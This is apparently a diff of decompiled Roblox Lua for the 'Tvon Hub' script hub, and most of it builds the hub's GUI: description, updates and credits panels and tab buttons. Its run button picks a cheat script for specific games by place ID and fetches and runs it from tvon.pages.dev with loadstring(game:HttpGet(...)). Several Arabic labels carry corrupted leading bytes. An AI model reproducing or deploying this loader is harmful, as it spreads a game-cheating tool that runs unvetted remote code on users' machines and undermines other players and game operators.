+		v177.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v177.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v177.BorderSizePixel = 0
+		v178.Name = "DescriptionFrame"
+		v178.Parent = v_u_175
+		v178.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+		v178.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v178.BorderSizePixel = 0
+		v178.Position = UDim2.new(0.0462962948, 0, 0.0583657585, 0)
+		v178.Size = UDim2.new(0, 245, 0, 86)
+		v179.CornerRadius = UDim.new(0, 13)
+		v179.Name = "DescriptionFrameCorner"
+		v179.Parent = v178
+		v180.Color = Color3.fromRGB(50, 50, 40)
+		v180.Name = "DescriptionFrameStroke"
+		v180.Parent = v178
+		v181.Name = "DescriptionFrameLine"
+		v181.Parent = v178
+		v181.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+		v181.BackgroundTransparency = 0.5
+		v181.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v181.BorderSizePixel = 0
+		v181.Position = UDim2.new(0, 0, 2.34750601e-7, 0)
+		v181.Size = UDim2.new(0, 245, 0, 31)
+		v182.CornerRadius = UDim.new(0, 13)
+		v182.Name = "DescriptionFrameLineCorner"
+		v182.Parent = v181
+		v183.Name = "DescriptionFrameLineCornerFixer"
+		v183.Parent = v181
+		v183.AnchorPoint = Vector2.new(0.5, 0.5)
+		v183.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+		v183.BackgroundTransparency = 0.5
+		v183.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v183.BorderSizePixel = 0
+		v183.Position = UDim2.new(0.5, 0, 0.822580636, 0)
+		v183.Size = UDim2.new(0, 245, 0, 11)
+		v184.Name = "DescriptionFrameIcon"
+		v184.Parent = v181
+		v184.AnchorPoint = Vector2.new(0.5, 0.5)
+		v184.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v184.BackgroundTransparency = 2
+		v184.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v184.BorderSizePixel = 0
+		v184.Position = UDim2.new(0.920408189, 0, 0.5, 0)
+		v184.Size = UDim2.new(0, 18, 0, 18)
+		v184.Image = "rbxassetid://11432852769"
+		v184.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		v185.Name = "DescriptionFrameText"
+		v185.Parent = v181
+		v185.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v185.BackgroundTransparency = 2
+		v185.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v185.BorderSizePixel = 0
+		v185.Size = UDim2.new(0, 210, 0, 31)
+		v185.Font = Enum.Font.SourceSansBold
+		v185.Text = "\239\191\189\216\168\216\176\216\169"
+		v185.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v185.TextSize = 14
+		v185.TextXAlignment = Enum.TextXAlignment.Right
+		v186.Name = "Description"
+		v186.Parent = v178
+		v186.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v186.BackgroundTransparency = 2
+		v186.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v186.BorderSizePixel = 0
+		v186.Position = UDim2.new(0.0326530598, 0, 0.465116292, 0)
+		v186.Size = UDim2.new(0, 227, 0, 34)
+		v186.Font = Enum.Font.SourceSans
+		v186.Text = "\239\191\189\217\131\216\177\216\168\216\170 Tvon Hub \217\138\216\185\216\170\216\168\216\177 \216\167\217\132\216\167\217\129\216\182\217\132 \217\133\217\134 \217\134\216\167\216\173\217\138\216\169 \216\167\217\132\216\167\217\133\216\167\217\134 \217\136 \216\167\217\132\216\167\216\175\216\167\216\161  \216\167\217\138\216\182\216\167\217\139 \217\131\217\132 \217\135\216\167\216\176\216\167 \217\133\216\172\216\167\217\134\216\167\217\139 \216\175\217\136\217\134 \216\175\217\129\216\185 \216\167\217\138 \216\177\216\179\217\136\217\133"
+		v186.TextColor3 = Color3.fromRGB(168, 168, 168)
+		v186.TextSize = 14
+		v186.TextWrapped = true
+		v186.TextXAlignment = Enum.TextXAlignment.Right
+		v186.TextYAlignment = Enum.TextYAlignment.Top
+		v187.Name = "InformationFrame"
+		v187.Parent = v_u_175
+		v187.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+		v187.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v187.BorderSizePixel = 0
+		v187.Position = UDim2.new(0.0462962948, 0, 0.416342407, 0)
+		v187.Size = UDim2.new(0, 245, 0, 130)
+		v188.CornerRadius = UDim.new(0, 13)
+		v188.Name = "InformationFrameCorner"
+		v188.Parent = v187
+		v189.Name = "InformationFrameLine"
+		v189.Parent = v187
+		v189.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+		v189.BackgroundTransparency = 0.5
+		v189.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v189.BorderSizePixel = 0
+		v189.Position = UDim2.new(0, 0, 2.34750601e-7, 0)
+		v189.Size = UDim2.new(0, 245, 0, 31)
+		v190.CornerRadius = UDim.new(0, 13)
+		v190.Name = "InformationFrameLineCorner"
+		v190.Parent = v189
+		v191.Name = "InformationFrameLineCornerFixer"
+		v191.Parent = v189
+		v191.AnchorPoint = Vector2.new(0.5, 0.5)
+		v191.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+		v191.BackgroundTransparency = 0.5
+		v191.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v191.BorderSizePixel = 0
+		v191.Position = UDim2.new(0.5, 0, 0.822580636, 0)
+		v191.Size = UDim2.new(0, 245, 0, 11)
+		v192.Name = "InformationFrameIcon"
+		v192.Parent = v189
+		v192.AnchorPoint = Vector2.new(0.5, 0.5)
+		v192.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v192.BackgroundTransparency = 2
+		v192.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v192.BorderSizePixel = 0
+		v192.Position = UDim2.new(0.920408189, 0, 0.5, 0)
+		v192.Size = UDim2.new(0, 18, 0, 18)
+		v192.Image = "rbxassetid://11422145135"
+		v192.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		v193.Name = "InformationFrameIconText"
+		v193.Parent = v189
+		v193.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v193.BackgroundTransparency = 2
+		v193.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v193.BorderSizePixel = 0
+		v193.Size = UDim2.new(0, 210, 0, 31)
+		v193.Font = Enum.Font.SourceSansBold
+		v193.Text = "\239\191\189\216\185\217\132\217\136\217\133\216\167\216\170"
+		v193.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v193.TextSize = 14
+		v193.TextXAlignment = Enum.TextXAlignment.Right
+		v194.Color = Color3.fromRGB(50, 50, 40)
+		v194.Name = "InformationFrameStroke"
+		v194.Parent = v187
+		v195.Name = "InformationDescription"
+		v195.Parent = v187
+		v195.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v195.BackgroundTransparency = 2
+		v195.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v195.BorderSizePixel = 0
+		v195.Position = UDim2.new(0.0329999998, 0, 0.30399999, 0)
+		v195.Size = UDim2.new(0, 227, 0, 83)
+		v195.Font = Enum.Font.SourceSans
+		v195.TextColor3 = Color3.fromRGB(168, 168, 168)
+		v195.TextSize = 14
+		v195.TextWrapped = true
+		v195.TextXAlignment = Enum.TextXAlignment.Right
+		v195.TextYAlignment = Enum.TextYAlignment.Top
+		v196.Name = "HomeScrollingFrameCorner"
+		v196.Parent = v_u_175
+		v_u_197.Name = "UpdateScrollingFrame"
+		v_u_197.Parent = v174
+		v_u_197.Active = true
+		v_u_197.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+		v_u_197.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_197.BorderSizePixel = 0
+		v_u_197.Position = UDim2.new(0.00249999994, 0, 0.143333331, 0)
+		v_u_197.Size = UDim2.new(0, 270, 0, 257)
+		v_u_197.Visible = false
+		v_u_197.BottomImage = ""
+		v_u_197.CanvasSize = UDim2.new(0, 0, 1, 0)
+		v_u_197.BottomImage = ""
+		v_u_197.MidImage = "rbxassetid://6015897843"
+		v_u_197.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 50)
+		v_u_197.TopImage = ""
+		v_u_197.ScrollBarThickness = 3
+		v_u_197.TopImage = ""
+		v_u_198.Name = "UpdateScrollingFrameListLayout"
+		v_u_198.Parent = v_u_197
+		v_u_198.HorizontalAlignment = Enum.HorizontalAlignment.Center
+		v_u_198.SortOrder = Enum.SortOrder.LayoutOrder
+		v_u_198.Padding = UDim.new(0, 15)
+		v199.Name = "UpdateScrollingFrameTabFixer"
+		v199.Parent = v_u_197
+		v199.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v199.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v199.BorderSizePixel = 0
+		function v162.AddUpdate(_, p243)
+			-- upvalues: (ref) v_u_197, (ref) v_u_200, (ref) v_u_198
+			local v244 = p243 or {}
+			v244.Name = v244.Name or "v0.1"
+			local v_u_245 = Instance.new("Frame")
+			local v246 = Instance.new("UICorner")
+			local v247 = Instance.new("UIStroke")
+			local v248 = Instance.new("Frame")
+			local v249 = Instance.new("UICorner")
+			local v250 = Instance.new("Frame")
+			local v_u_251 = Instance.new("Frame")
+			local v_u_252 = Instance.new("UIListLayout")
+			local v253 = Instance.new("TextLabel")
+			v_u_245.Name = "UpdateFrame"
+			v_u_245.Parent = v_u_197
+			v_u_245.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+			v_u_245.BorderColor3 = Color3.fromRGB(0, 0, 0)
+			v_u_245.BorderSizePixel = 0
+			v_u_245.Position = UDim2.new(0.0462962948, 0, 0.0583657585, 0)
+			v_u_245.Size = UDim2.new(0, 245, 0, 58)
+			v246.CornerRadius = UDim.new(0, 13)
+			v246.Name = "UpdateFrameCorner"
+			v246.Parent = v_u_245
+			v247.Color = Color3.fromRGB(50, 50, 40)
+			v247.Name = "UpdateFrameStroke"
+			v247.Parent = v_u_245
+			v248.Name = "UpdateFrameLine"
+			v248.Parent = v_u_245
+			v248.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+			v248.BackgroundTransparency = 0.5
+			v248.BorderColor3 = Color3.fromRGB(0, 0, 0)
+			v248.BorderSizePixel = 0
+			v248.Position = UDim2.new(0, 0, 2.34750601e-7, 0)
+			v248.Size = UDim2.new(0, 245, 0, 31)
+			v249.CornerRadius = UDim.new(0, 13)
+			v249.Name = "UpdateFrameLineCorner"
+			v249.Parent = v248
+			v250.Name = "UpdateFrameLineCornerFixer"
+			v250.Parent = v248
+			v250.AnchorPoint = Vector2.new(0.5, 0.5)
+			v250.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+			v250.BackgroundTransparency = 0.5
+			v250.BorderColor3 = Color3.fromRGB(0, 0, 0)
+			v250.BorderSizePixel = 0
+			v250.Position = UDim2.new(0.5, 0, 0.822580636, 0)
+			v250.Size = UDim2.new(0, 245, 0, 11)
+			v_u_251.Name = "TextList"
+			v_u_251.Parent = v248
+			v_u_251.AnchorPoint = Vector2.new(1, 1)
+			v_u_251.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+			v_u_251.BackgroundTransparency = 2
+			v_u_251.BorderColor3 = Color3.fromRGB(0, 0, 0)
+			v_u_251.BorderSizePixel = 0
+			v_u_251.Position = UDim2.new(0.965, 0, 1.871, 0)
+			v_u_251.Size = UDim2.new(0, 236, 0, 23)
+			v_u_252.Name = "TextListLayout"
+			v_u_252.Parent = v_u_251
+			v_u_252.SortOrder = Enum.SortOrder.LayoutOrder
+			v253.Name = "UpdateFrameText"
+			v253.Parent = v248
+			v253.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+			v253.BackgroundTransparency = 2
+			v253.BorderColor3 = Color3.fromRGB(0, 0, 0)
+			v253.BorderSizePixel = 0
+			v253.Position = UDim2.new(0.0571428575, 0, 0, 0)
+			v253.Size = UDim2.new(0, 196, 0, 31)
+			v253.Font = Enum.Font.SourceSansBold
+			v253.Text = v244.Name
+			v253.TextColor3 = Color3.fromRGB(184, 197, 239)
+			v253.TextSize = 14
+			v253.TextXAlignment = Enum.TextXAlignment.Left
+			v_u_200.Name = "UpdateScrollingFrameCorner"
+			v_u_200.Parent = v_u_197
+			return {
+				["AddLabel"] = function(_, p254)
+					-- upvalues: (ref) v_u_251, (ref) v_u_245, (ref) v_u_252, (ref) v_u_197, (ref) v_u_198
+					local v255 = p254 or {}
+					v255.Text = v255.Text or "???"
+					local v256 = Instance.new("TextLabel")
+					v256.Name = "UpdateFrameLineText"
+					v256.Parent = v_u_251
+					v256.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+					v256.BackgroundTransparency = 2
+					v256.BorderColor3 = Color3.fromRGB(0, 0, 0)
+					v256.BorderSizePixel = 0
+					v256.Size = UDim2.new(0, 237, 0, 18)
+					v256.Font = Enum.Font.SourceSans
+					v256.Text = v255.Text
+					v256.TextColor3 = Color3.fromRGB(168, 168, 168)
+					v256.TextSize = 14
+					v256.TextWrapped = true
+					v256.TextXAlignment = Enum.TextXAlignment.Right
+					v_u_245.Size = UDim2.new(0, 245, 0, v_u_252.AbsoluteContentSize.Y + 40)
+					v_u_197.CanvasSize = UDim2.new(0, 0, 0.1, v_u_198.AbsoluteContentSize.Y)
+				end
+			}
+		end
+		v_u_201.Name = "CreditsFrameScrollingFrame"
+		v_u_201.Parent = v174
+		v_u_201.Active = true
+		v_u_201.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+		v_u_201.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_201.BorderSizePixel = 0
+		v_u_201.Position = UDim2.new(0.00249999994, 0, 0.143333331, 0)
+		v_u_201.Size = UDim2.new(0, 270, 0, 257)
+		v_u_201.Visible = false
+		v_u_201.BottomImage = ""
+		v_u_201.CanvasSize = UDim2.new(0, 0, 1, 0)
+		v_u_201.BottomImage = ""
+		v_u_201.MidImage = "rbxassetid://6015897843"
+		v_u_201.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 50)
+		v_u_201.TopImage = ""
+		v_u_201.ScrollBarThickness = 3
+		v_u_201.TopImage = ""
+		v202.Name = "CreditsScrollingFrameListLayout"
+		v202.Parent = v_u_201
+		v202.HorizontalAlignment = Enum.HorizontalAlignment.Center
+		v202.SortOrder = Enum.SortOrder.LayoutOrder
+		v202.Padding = UDim.new(0, 15)
+		v203.Name = "CreditsFrameScrollingFrameTabFixer"
+		v203.Parent = v_u_201
+		v203.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v203.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v203.BorderSizePixel = 0
+		v204.Name = "CreditsScrollingFrameCorner"
+		v204.Parent = v_u_201
+		v205.Name = "CreditsFrame"
+		v205.Parent = v_u_201
+		v205.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+		v205.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v205.BorderSizePixel = 0
+		v205.Position = UDim2.new(0.0462962948, 0, 0.416342407, 0)
+		v205.Size = UDim2.new(0, 245, 0, 130)
+		v206.CornerRadius = UDim.new(0, 13)
+		v206.Name = "CreditsFrameCorner"
+		v206.Parent = v205
+		v207.Name = "CreditsFrameLine"
+		v207.Parent = v205
+		v207.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+		v207.BackgroundTransparency = 0.5
+		v207.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v207.BorderSizePixel = 0
+		v207.Position = UDim2.new(0, 0, 2.34750601e-7, 0)
+		v207.Size = UDim2.new(0, 245, 0, 31)
+		v208.CornerRadius = UDim.new(0, 13)
+		v208.Name = "CreditsFrameCorner"
+		v208.Parent = v207
+		v209.Name = "CreditsFrameCornerFixer"
+		v209.Parent = v207
+		v209.AnchorPoint = Vector2.new(0.5, 0.5)
+		v209.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
+		v209.BackgroundTransparency = 0.5
+		v209.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v209.BorderSizePixel = 0
+		v209.Position = UDim2.new(0.5, 0, 0.822580636, 0)
+		v209.Size = UDim2.new(0, 245, 0, 11)
+		v210.Name = "CreditsFrameIcon"
+		v210.Parent = v207
+		v210.AnchorPoint = Vector2.new(0.5, 0.5)
+		v210.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v210.BackgroundTransparency = 2
+		v210.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v210.BorderSizePixel = 0
+		v210.Position = UDim2.new(0.920408189, 0, 0.5, 0)
+		v210.Size = UDim2.new(0, 18, 0, 18)
+		v210.Image = "rbxassetid://11326671926"
+		v210.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		v211.Name = "CreditsFrameIconText"
+		v211.Parent = v207
+		v211.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v211.BackgroundTransparency = 2
+		v211.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v211.BorderSizePixel = 0
+		v211.Size = UDim2.new(0, 210, 0, 31)
+		v211.Font = Enum.Font.SourceSansBold
+		v211.Text = "\239\191\189\217\132\216\173\217\130\217\136\217\130"
+		v211.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v211.TextSize = 14
+		v211.TextXAlignment = Enum.TextXAlignment.Right
+		v212.Color = Color3.fromRGB(50, 50, 40)
+		v212.Name = "CreditsFrameStroke"
+		v212.Parent = v205
+		v213.Name = "CreditsFrameDescription"
+		v213.Parent = v205
+		v213.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v213.BackgroundTransparency = 2
+		v213.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v213.BorderSizePixel = 0
+		v213.Position = UDim2.new(0.0329999998, 0, 0.30399999, 0)
+		v213.Size = UDim2.new(0, 227, 0, 83)
+		v213.Font = Enum.Font.SourceSans
+		v213.Text = ""
+		v213.TextColor3 = Color3.fromRGB(168, 168, 168)
+		v213.TextSize = 14
+		v213.TextWrapped = true
+		v213.TextXAlignment = Enum.TextXAlignment.Right
+		v213.TextYAlignment = Enum.TextYAlignment.Top
+		v214.Name = "TvonIcon"
+		v214.Parent = v205
+		v214.AnchorPoint = Vector2.new(0.5, 0.5)
+		v214.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v214.BackgroundTransparency = 1
+		v214.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v214.BorderSizePixel = 0
+		v214.Position = UDim2.new(0.218367353, 0, 0.623076916, 0)
+		v214.Size = UDim2.new(0, 70, 0, 70)
+		v214.Image = "http://www.roblox.com/asset/?id=77217812396965"
+		v215.CornerRadius = UDim.new(0, 10)
+		v215.Name = "TvonIconCorner"
+		v215.Parent = v214
+		v216.Name = "ScText"
+		v216.Parent = v205
+		v216.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v216.BackgroundTransparency = 2
+		v216.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v216.BorderSizePixel = 0
+		v216.Position = UDim2.new(0.412244886, 0, 0.353846163, 0)
+		v216.Size = UDim2.new(0, 133, 0, 16)
+		v216.Font = Enum.Font.SourceSansBold
+		v216.Text = "Script Developer : @snoobe1"
+		v216.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v216.TextSize = 12
+		v216.TextXAlignment = Enum.TextXAlignment.Left
+		v216.TextYAlignment = Enum.TextYAlignment.Top
+		v217.Name = "ScDis"
+		v217.Parent = v205
+		v217.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v217.BackgroundTransparency = 2
+		v217.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v217.BorderSizePixel = 0
+		v217.Position = UDim2.new(0.412244886, 0, 0.469230771, 0)
+		v217.Size = UDim2.new(0, 133, 0, 16)
+		v217.Font = Enum.Font.SourceSansBold
+		v217.Text = "\239\191\189\216\168\216\177\217\133\216\172 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\168\216\180\217\131\217\132 \216\185\216\167\217\133"
+		v217.TextColor3 = Color3.fromRGB(108, 117, 141)
+		v217.TextSize = 9
+		v217.TextXAlignment = Enum.TextXAlignment.Left
+		v218.Name = "UiDis"
+		v218.Parent = v205
+		v218.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v218.BackgroundTransparency = 2
+		v218.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v218.BorderSizePixel = 0
+		v218.Position = UDim2.new(0.412244886, 0, 0.769230783, 0)
+		v218.Size = UDim2.new(0, 133, 0, 16)
+		v218.Font = Enum.Font.SourceSansBold
+		v218.Text = "\239\191\189\216\181\217\133\217\133 \217\130\216\167\216\166\217\133\216\169 \216\167\217\132\216\170\216\180\216\186\217\138\217\132"
+		v218.TextColor3 = Color3.fromRGB(108, 117, 141)
+		v218.TextSize = 9
+		v218.TextXAlignment = Enum.TextXAlignment.Left
+		v219.Name = "UiText"
+		v219.Parent = v205
+		v219.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v219.BackgroundTransparency = 2
+		v219.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v219.BorderSizePixel = 0
+		v219.Position = UDim2.new(0.412244886, 0, 0.653846145, 0)
+		v219.Size = UDim2.new(0, 133, 0, 16)
+		v219.Font = Enum.Font.SourceSansBold
+		v219.Text = "Ui Loader : @11x"
+		v219.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v219.TextSize = 12
+		v219.TextXAlignment = Enum.TextXAlignment.Left
+		v219.TextYAlignment = Enum.TextYAlignment.Top
+		v220.Name = "TabScrollingFrame"
+		v220.Parent = v_u_165
+		v220.Active = true
+		v220.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+		v220.BackgroundTransparency = 2
+		v220.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v220.BorderSizePixel = 0
+		v220.Position = UDim2.new(0.67750001, 0, 0.143333331, 0)
+		v220.Size = UDim2.new(0, 129, 0, 257)
+		v220.BottomImage = ""
+		v220.CanvasSize = UDim2.new(0, 0, 0, 0)
+		v220.BottomImage = ""
+		v220.MidImage = "rbxassetid://6015897843"
+		v220.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 50)
+		v220.TopImage = ""
+		v220.ScrollBarThickness = 0
+		v220.TopImage = ""
+		v221.Name = "TabScrollingFrameListLayout"
+		v221.Parent = v220
+		v221.HorizontalAlignment = Enum.HorizontalAlignment.Center
+		v221.SortOrder = Enum.SortOrder.LayoutOrder
+		v221.Padding = UDim.new(0, 15)
+		v222.Name = "TabFixer"
+		v222.Parent = v220
+		v222.AnchorPoint = Vector2.new(0.5, 0.5)
+		v222.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v222.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v222.BorderSizePixel = 0
+		v223.Name = "TabScrollingFrameCorner"
+		v223.Parent = v220
+		v224.Name = "HomeButton"
+		v224.Parent = v220
+		v224.BackgroundColor3 = Color3.fromRGB(184, 197, 239)
+		v224.BackgroundTransparency = 1
+		v224.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v224.BorderSizePixel = 0
+		v224.Position = UDim2.new(0.0852713212, 0, 0.0583657585, 0)
+		v224.Size = UDim2.new(0, 117, 0, 31)
+		v224.AutoButtonColor = false
+		v224.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+		v224.ImageTransparency = 1
+		v225.CornerRadius = UDim.new(0, 9)
+		v225.Parent = v224
+		v_u_226.Parent = v224
+		v_u_226.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_226.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_226.BackgroundTransparency = 2
+		v_u_226.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_226.BorderSizePixel = 0
+		v_u_226.Position = UDim2.new(0.773504257, 0, 0.5, 0)
+		v_u_226.Size = UDim2.new(0, 20, 0, 20)
+		v_u_226.Image = "rbxassetid://11433532654"
+		v_u_226.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		v_u_227.Parent = v224
+		v_u_227.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_227.BackgroundTransparency = 2
+		v_u_227.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_227.BorderSizePixel = 0
+		v_u_227.Size = UDim2.new(0, 74, 0, 31)
+		v_u_227.Font = Enum.Font.SourceSans
+		v_u_227.Text = "\239\191\189\217\132\216\177\216\166\217\138\216\179\217\138\216\169"
+		v_u_227.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v_u_227.TextSize = 15
+		v_u_227.TextXAlignment = Enum.TextXAlignment.Right
+		v228.Name = "UpdateButton"
+		v228.Parent = v220
+		v228.BackgroundColor3 = Color3.fromRGB(184, 197, 239)
+		v228.BackgroundTransparency = 2
+		v228.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v228.BorderSizePixel = 0
+		v228.Position = UDim2.new(0.0852713212, 0, 0.0583657585, 0)
+		v228.Size = UDim2.new(0, 117, 0, 31)
+		v228.AutoButtonColor = false
+		v228.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+		v228.ImageTransparency = 1
+		v229.CornerRadius = UDim.new(0, 9)
+		v229.Parent = v228
+		v_u_230.Parent = v228
+		v_u_230.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_230.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_230.BackgroundTransparency = 2
+		v_u_230.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_230.BorderSizePixel = 0
+		v_u_230.Position = UDim2.new(0.773504257, 0, 0.5, 0)
+		v_u_230.Size = UDim2.new(0, 20, 0, 20)
+		v_u_230.Image = "rbxassetid://11430232701"
+		v_u_230.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		v_u_231.Parent = v228
+		v_u_231.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_231.BackgroundTransparency = 2
+		v_u_231.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_231.BorderSizePixel = 0
+		v_u_231.Size = UDim2.new(0, 74, 0, 31)
+		v_u_231.Font = Enum.Font.SourceSans
+		v_u_231.Text = "\239\191\189\217\132\216\170\216\173\216\175\217\138\216\171\216\167\216\170"
+		v_u_231.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v_u_231.TextSize = 15
+		v_u_231.TextXAlignment = Enum.TextXAlignment.Right
+		v232.Name = "CreditsButton"
+		v232.Parent = v220
+		v232.BackgroundColor3 = Color3.fromRGB(184, 197, 239)
+		v232.BackgroundTransparency = 2
+		v232.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v232.BorderSizePixel = 0
+		v232.Position = UDim2.new(0.0852713212, 0, 0.0583657585, 0)
+		v232.Size = UDim2.new(0, 117, 0, 31)
+		v232.AutoButtonColor = false
+		v232.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+		v232.ImageTransparency = 1
+		v233.CornerRadius = UDim.new(0, 9)
+		v233.Parent = v232
+		v_u_234.Parent = v232
+		v_u_234.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_234.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_234.BackgroundTransparency = 2
+		v_u_234.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_234.BorderSizePixel = 0
+		v_u_234.Position = UDim2.new(0.773504257, 0, 0.5, 0)
+		v_u_234.Size = UDim2.new(0, 20, 0, 20)
+		v_u_234.Image = "rbxassetid://11432859451"
+		v_u_234.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		v_u_235.Parent = v232
+		v_u_235.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_235.BackgroundTransparency = 2
+		v_u_235.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_235.BorderSizePixel = 0
+		v_u_235.Size = UDim2.new(0, 74, 0, 31)
+		v_u_235.Font = Enum.Font.SourceSans
+		v_u_235.Text = "\239\191\189\217\132\216\173\217\130\217\136\217\130"
+		v_u_235.TextColor3 = Color3.fromRGB(184, 197, 239)
+		v_u_235.TextSize = 15
+		v_u_235.TextXAlignment = Enum.TextXAlignment.Right
+		v_u_236.Name = "RunButton"
+		v_u_236.Parent = v_u_165
+		v_u_236.AnchorPoint = Vector2.new(1, 0)
+		v_u_236.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_236.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_236.BorderSizePixel = 0
+		v_u_236.Position = UDim2.new(1, -7, 0.899999976, -7)
+		v_u_236.Size = UDim2.new(0, 30, 0, 30)
+		v_u_236.AutoButtonColor = false
+		v_u_236.ImageColor3 = Color3.fromRGB(184, 197, 239)
+		local v_u_257 = false
+		v_u_236.MouseButton1Click:Connect(function()
+			-- upvalues: (ref) v_u_257
+			if not v_u_257 then
+				v_u_257 = true
+				_G.RunAnim()
+				local v258 = "https://tvon.pages.dev/lua/" .. (({
+					[142823291] = "MM2.lua",
+					[11379739543] = "TimeBomb.lua",
+					[98752102030179] = "TimeBomb.lua",
+					[17723040340] = "TGM3.lua"
+				})[game.PlaceId] or "ShalehM7md.lua")
+				loadstring(game:HttpGet(v258))()
+			end
+		end)
+		v_u_236.MouseEnter:Connect(function()
+			-- upvalues: (ref) v_u_161, (ref) v_u_236, (ref) v_u_238, (ref) v_u_241
+			v_u_161:Create(v_u_236, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Size"] = UDim2.new(0, 111, 0, 30)
+			}):Play()
+			v_u_161:Create(v_u_238, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				["Position"] = UDim2.new(0.849, 0, 0.5, 0)
+			}):Play()
